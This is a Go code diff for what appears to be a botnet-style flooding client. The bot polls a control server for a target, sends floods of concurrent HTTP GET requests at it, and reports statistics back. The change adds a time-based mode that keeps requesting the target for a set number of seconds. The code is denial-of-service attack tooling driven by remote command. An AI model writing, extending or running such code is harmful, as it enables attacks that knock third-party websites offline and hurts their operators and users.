@@ -17,9 +17,11 @@ type ResultsObject struct {
 }
 
 type TargetInfo struct {
-	Status     bool
-	TargetUrl  string
-	RequestNum int
+	Status      bool
+	TargetUrl   string
+	RequestNum  int
+	Mode        string
+	TimeSeconds int
 }
 
 func main() {
@@ -29,7 +31,7 @@ func main() {
 	// }
 }
 
-func SendRequests(target string, requestsNum int, goroutinesNum int) *ResultsObject {
+func SendRequests(target string, requestsNum int, goroutinesNum int, mode string, timeSeconds int) *ResultsObject {
 	var statusCodes []int
 	var wg sync.WaitGroup
 
@@ -37,7 +39,12 @@ func SendRequests(target string, requestsNum int, goroutinesNum int) *ResultsObj
 
 	wg.Add(goroutinesNum)
 	for i := 0; i < goroutinesNum; i++ {
-		go SendRequestGoroutine("https://hackertyper.com/", requestsNum/goroutinesNum, ch, &wg)
+		if mode == "timeMode" {
+			go SendRequestGoroutineTime("https://hackertyper.com/", timeSeconds, ch, &wg)
+		} else {
+			go SendRequestGoroutine("https://hackertyper.com/", requestsNum/goroutinesNum, ch, &wg)
+		}
+
 	}
 
 	go func() {
@@ -69,6 +76,29 @@ func SendRequestGoroutine(target string, times int, ch chan http.Response, wg *s
 			panic(err)
 		}
 		ch <- *response
+	}
+}
+
+func SendRequestGoroutineTime(target string, timeSeconds int, ch chan http.Response, wg *sync.WaitGroup) {
+	defer wg.Done()
+
+	now := time.Now()
+
+	after := now.Add(time.Duration(timeSeconds) * time.Second)
+
+	for {
+		response, err := http.Get(target)
+		if err != nil {
+			fmt.Println("Target GET request error.")
+			panic(err)
+		}
+		ch <- *response
+
+		now = time.Now()
+
+		if now.After(after) {
+			break
+		}
 	}
 }
 
@@ -113,7 +143,7 @@ func StartBot(serverUrl string) {
 
 	if targetObject.Status && (targetObject.TargetUrl != "") {
 		var RequestInfo *ResultsObject = SendRequests(targetObject.TargetUrl,
-			targetObject.RequestNum, goRoutinesNum)
+			targetObject.RequestNum, goRoutinesNum, targetObject.Mode, targetObject.TimeSeconds)
 		SendBotStats(serverUrl, *RequestInfo)
 	}
 
